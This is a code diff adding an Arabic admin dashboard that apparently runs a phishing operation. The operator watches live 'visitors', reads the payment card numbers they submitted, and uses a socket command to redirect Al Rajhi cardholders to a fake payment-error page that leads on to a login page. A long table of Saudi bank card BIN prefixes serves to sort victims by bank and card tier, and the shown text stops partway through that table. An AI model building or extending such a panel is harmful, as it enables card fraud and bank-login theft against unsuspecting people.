@@ -1,0 +1,1976 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>لوحة التحكم - سجل</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
+    body { font-family: 'Tajawal', sans-serif; }
+    .visitor-card { transition: all 0.3s ease; }
+    .visitor-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+    .pulse { animation: pulse 2s infinite; }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    .waiting-badge { animation: blink 1s infinite; }
+    @keyframes blink {
+      0%, 100% { background-color: #fef3c7; }
+      50% { background-color: #fde68a; }
+    }
+    .data-section { border-right: 4px solid #3b82f6; }
+    .disconnected { opacity: 0.6; }
+  </style>
+</head>
+<body class="bg-gray-100 min-h-screen">
+  <!-- Login Modal -->
+  <div id="loginModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50" style="display: none;">
+    <div class="bg-white rounded-xl p-8 max-w-md w-full mx-4">
+      <h2 class="text-2xl font-bold text-center mb-6">تسجيل الدخول</h2>
+      <form id="loginForm">
+        <div class="mb-4">
+          <label class="block text-gray-700 mb-2">كلمة المرور</label>
+          <input type="password" id="password" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="أدخل كلمة المرور">
+        </div>
+        <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">دخول</button>
+      </form>
+      <p id="loginError" class="text-red-500 text-center mt-4 hidden">كلمة المرور غير صحيحة</p>
+    </div>
+  </div>
+
+  <!-- Main Dashboard -->
+  <div id="dashboard" class="hidden">
+    <!-- Header -->
+    <header class="bg-white shadow-sm">
+      <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+          <div class="relative">
+            <button id="settingsBtn" onclick="toggleSettingsMenu()" class="p-2 hover:bg-gray-100 rounded-lg transition">
+              <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/>
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+              </svg>
+            </button>
+            <div id="settingsMenu" class="hidden absolute left-0 mt-2 w-48 bg-white rounded-lg shadow-lg border z-50">
+              <button onclick="showChangePasswordModal()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2">
+                <svg class="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/>
+                </svg>
+                <span>تغيير كلمة المرور</span>
+              </button>
+              <button onclick="clearAllData()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2 text-orange-600 border-t">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/>
+                </svg>
+                <span>مسح جميع البيانات</span>
+              </button>
+              <button onclick="logout()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2 text-red-600 border-t">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/>
+                </svg>
+                <span>تسجيل الخروج</span>
+              </button>
+            </div>
+          </div>
+          <h1 class="text-2xl font-bold text-gray-800">لوحة التحكم</h1>
+        </div>
+        <div class="flex items-center gap-4">
+          <span id="connectionStatus" class="flex items-center gap-2">
+            <span class="w-3 h-3 bg-green-500 rounded-full pulse"></span>
+            <span class="text-green-600">متصل</span>
+          </span>
+          <span id="visitorCount" class="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm">0 زائر</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- Change Password Modal -->
+    <div id="changePasswordModal" class="hidden fixed inset-0 bg-black/50 flex items-center justify-center z-50">
+      <div class="bg-white rounded-xl p-8 max-w-md w-full mx-4">
+        <h2 class="text-xl font-bold text-center mb-6">تغيير كلمة المرور</h2>
+        <form id="changePasswordForm">
+          <div class="mb-4">
+            <label class="block text-gray-700 mb-2">كلمة المرور الحالية</label>
+            <input type="password" id="oldPassword" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="أدخل كلمة المرور الحالية">
+          </div>
+          <div class="mb-4">
+            <label class="block text-gray-700 mb-2">كلمة المرور الجديدة</label>
+            <input type="password" id="newPassword" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="أدخل كلمة المرور الجديدة">
+          </div>
+          <div class="mb-4">
+            <label class="block text-gray-700 mb-2">تأكيد كلمة المرور الجديدة</label>
+            <input type="password" id="confirmPassword" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="أعد إدخال كلمة المرور الجديدة">
+          </div>
+          <div class="flex gap-3">
+            <button type="submit" class="flex-1 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">حفظ</button>
+            <button type="button" onclick="hideChangePasswordModal()" class="flex-1 bg-gray-200 text-gray-700 py-3 rounded-lg hover:bg-gray-300 transition">إلغاء</button>
+          </div>
+        </form>
+        <p id="passwordError" class="text-red-500 text-center mt-4 hidden"></p>
+        <p id="passwordSuccess" class="text-green-500 text-center mt-4 hidden">تم تغيير كلمة المرور بنجاح</p>
+      </div>
+    </div>
+
+    <div class="container mx-auto px-4 py-6 flex gap-6">
+      <!-- Visitors List -->
+      <div class="w-1/3">
+        <div class="bg-white rounded-xl shadow-sm p-4">
+          <h2 class="text-lg font-bold mb-2">الزوار</h2>
+          <div class="flex gap-2 mb-3">
+            <button onclick="selectAllVisitors()" class="flex-1 bg-blue-100 text-blue-700 px-3 py-1.5 rounded-lg text-sm hover:bg-blue-200 transition">تحديد الكل</button>
+            <button onclick="deleteSelectedVisitors()" class="flex-1 bg-red-100 text-red-700 px-3 py-1.5 rounded-lg text-sm hover:bg-red-200 transition">حذف المحددين</button>
+          </div>
+          <div id="visitorsList" class="space-y-3">
+            <p class="text-gray-500 text-center py-8">لا يوجد زوار حالياً</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Visitor Details -->
+      <div class="w-2/3">
+        <div id="visitorDetails" class="bg-white rounded-xl shadow-sm p-6">
+          <div class="text-center py-12 text-gray-500">
+            <svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
+            </svg>
+            <p>اختر زائر لعرض التفاصيل</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Socket connection
+    const SOCKET_URL = window.location.hostname === 'localhost' 
+      ? 'http://localhost:3001' 
+      : window.location.origin;
+    
+    let socket;
+    let visitors = new Map();
+    let selectedVisitorId = null;
+
+    // دالة التحقق إذا كانت البطاقة تابعة للراجحي
+    function isRajhiCard(visitor) {
+      // البحث في بطاقات الزائر (paymentCards هو الاسم الصحيح)
+      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
+        for (const card of visitor.paymentCards) {
+          const cardInfo = getCardInfo(card.cardNumber);
+          if (cardInfo.bank === 'الراجحي') {
+            return true;
+          }
+        }
+      }
+      return false;
+    }
+
+    // دالة تحويل العميل لصفحة خطأ الدفع الراجحي (ثم ينقر متابعة للذهاب لتسجيل الدخول)
+    function navigateToRajhi(socketId) {
+      socket.emit('admin:navigate', { visitorSocketId: socketId, page: 'rajhi-payment-error' });
+    }
+
+    // دالة تحديد معلومات البطاقة من رقم BIN
+    function getCardInfo(cardNumber) {
+      const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
+      const firstDigit = bin.charAt(0);
+      
+      // تحديد شبكة البطاقة
+      let network = 'غير معروف';
+      if (firstDigit === '4') network = 'Visa';
+      else if (firstDigit === '5') network = 'Mastercard';
+      else if (firstDigit === '6') network = 'Mada';
+      else if (bin.startsWith('34') || bin.startsWith('37')) network = 'Amex';
+      
+      // قاعدة بيانات BIN للبنوك السعودية - بيانات موثوقة من bincheck.io
+      // قاعدة بيانات BIN الشاملة للبنوك والمحافظ السعودية - 470+ رقم BIN
+      // تم جمعها من bincheck.io و bintable.com - آخر تحديث: يناير 2026
+      const binDatabase = {
+        // ===== البنك الأهلي السعودي (SNB) =====
+        '223379': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Platinum Flex' },
+        '223398': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Installment' },
+        '412113': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '430258': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '430259': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '430260': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '445303': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '450766': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '455698': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '465154': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '466515': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '473258': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '482052': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '483178': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '485005': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '485042': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '486094': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Gold' },
+        '486095': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '486096': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '490917': { bank: 'الأهلي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '491610': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '492145': { bank: 'الأهلي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '493428': { bank: 'الأهلي', network: 'Visa', type: 'Debit', tier: 'Platinum' },
+        '512220': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '512464': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '515079': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '515530': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '516138': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '517720': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '517918': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '518694': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Platinum Travel' },
+        '519310': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '519341': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '520430': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '520431': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '521031': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '521076': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '523954': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '523968': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '523998': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '524116': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '524130': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'World Flex' },
+        '524197': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '524388': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '525688': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '528597': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '529415': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '529499': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '531153': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Gold Payroll' },
+        '531505': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '532034': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '532166': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '532446': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '532448': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '533964': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '534186': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '534797': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '535311': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '535825': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Titanium' },
+        '536369': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '536567': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite Flex' },
+        '536813': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '537878': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '539034': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '539035': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '540613': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '541554': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '541891': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '542806': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '543085': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '544217': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '544744': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '545205': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Gold Payroll' },
+        '546336': { bank: 'الأهلي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '546631': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '548255': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '549699': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '549760': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '549954': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '552075': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552077': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '554180': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'World Elite' },
+        '555610': { bank: 'الأهلي', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '556675': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Corporate World' },
+        '556676': { bank: 'الأهلي', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '588848': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '588850': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Personal' },
+        '604906': { bank: 'الأهلي', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '968202': { bank: 'الأهلي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+        '968203': { bank: 'الأهلي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== مصرف الراجحي =====
+        '400067': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '400861': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '403024': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '405433': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '405454': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '407226': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '407281': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '407620': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '407654': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '409201': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '409246': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '410248': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '410249': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Business' },
+        '410621': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Business Enhanced' },
+        '414627': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '416634': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '417321': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '417323': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '418346': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '418347': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '419461': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '422689': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '423219': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '426362': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '428274': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '429927': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '432159': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '436321': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '441375': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '443926': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '444494': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '445309': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '445520': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '445521': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '445522': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '445827': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '446608': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '446609': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '455395': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '455421': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '455430': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '455708': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '455739': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '455740': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '457553': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '457597': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '458456': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '460120': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '460121': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '460191': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '462220': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Signature' },
+        '465254': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '465257': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '465259': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '465260': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '467323': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '472019': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '483115': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '484166': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '484783': { bank: 'الراجحي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '486653': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '490810': { bank: 'الراجحي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '490980': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '494329': { bank: 'الراجحي', network: 'Visa', type: 'Debit', tier: 'Business' },
+        '506968': { bank: 'الراجحي', network: 'Maestro', type: 'Debit', tier: 'Prepaid' },
+        '512623': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '524126': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '524266': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '542894': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '545619': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '549963': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '549964': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '554575': { bank: 'الراجحي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '968205': { bank: 'الراجحي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== مصرف الإنماء =====
+        '404116': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '407197': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Corporate' },
+        '407395': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '412565': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '425896': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '426897': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '428671': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Gold' },
+        '428672': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Business Enhanced' },
+        '428673': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '428678': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '428679': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '432326': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '432327': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '432328': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '433366': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '434107': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '444397': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '446672': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Signature' },
+        '446673': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '454807': { bank: 'الإنماء', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '457998': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '458270': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '472106': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '483432': { bank: 'الإنماء', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '529157': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '529178': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '530481': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '532720': { bank: 'الإنماء', network: 'Mastercard', type: 'Debit', tier: 'Premium' },
+        '543357': { bank: 'الإنماء', network: 'mada', type: 'Debit', tier: 'Prepaid Business' },
+        '547026': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '551882': { bank: 'الإنماء', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '552363': { bank: 'الإنماء', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '626259': { bank: 'الإنماء', network: 'UnionPay', type: 'Credit', tier: 'Standard' },
+        '968206': { bank: 'الإنماء', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== بنك الرياض =====
+        '223463': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '232120': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '232520': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '401560': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '406471': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Purchasing' },
+        '416041': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '416042': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '428973': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '435700': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '448509': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '451475': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Signature' },
